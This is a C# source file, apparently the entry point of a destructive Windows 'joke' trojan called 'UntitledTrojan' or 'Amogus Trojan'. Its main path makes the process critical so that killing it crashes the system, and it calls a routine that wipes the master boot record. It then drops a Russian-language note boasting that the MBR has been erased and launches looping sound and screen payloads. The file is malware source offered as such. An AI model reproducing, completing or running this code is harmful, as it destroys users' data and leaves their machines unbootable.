using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Media;
using UntitledTrojan.Payloads;
using UntitledTrojan.Properties;
using UntitledTrojan.Tools;

namespace UntitledTrojan
{
    internal static class Entry
    {
        internal static bool debug = Debugger.IsAttached;
        [DllImport("ntdll.dll", SetLastError = true)]
        internal static extern void RtlSetProcessIsCritical(int v1, int v2, int v3);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        internal static async Task Main(string[] args)
        {
            // Initialize

            SetProcessDPIAware();
            if (debug) MessageBox.Show("DEBUG ENABLED!");

            if (Failsafe.FailMain())
            {
                if (debug)
                {
                    // Harmless payload
                    File.WriteAllText(@"C:\trash.txt", "Твой компьютер был заражен Amogus Trojan!\nДаже не пытайся его удалить, " +
                        "твой MBR уже был стёрт!\n\nСоздано TheAirBlow 2021 (https://vk.com/theairblow)");
                    Process.Start(@"C:\trash.txt");
                    await Task.Delay(10000);
                    SoundPlayer s = new SoundPlayer(Resources.amogus);
                    s.PlayLooping();
                    DisplayFuck.StartAmogus(1000000);
                    await PayloadsManager.OnTick();
                }
                else
                {
                    // Main payload
                    MakeUnclosable();
                    MBR.FuckMBR();
                    File.WriteAllText(@"C:\trash.txt", "Твой компьютер был заражен Amogus Trojan!\nДаже не пытайся его удалить, " +
                        "твой MBR уже был стёрт!\n\nСоздано TheAirBlow 2021 (https://vk.com/theairblow)");
                    Process.Start(@"C:\trash.txt");
                    await Task.Delay(100000);
                    SoundPlayer s = new SoundPlayer(Resources.amogus);
                    s.PlayLooping();
                    DisplayFuck.StartAmogus(1000000);
                    await PayloadsManager.OnTick();
                }
            }
        }

        internal static void MakeUnclosable()
        {
            // Make itself a critical process
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        internal static void Crash()
        {
            // Kill itself
            Process.GetCurrentProcess().Kill();
        }
    }
}
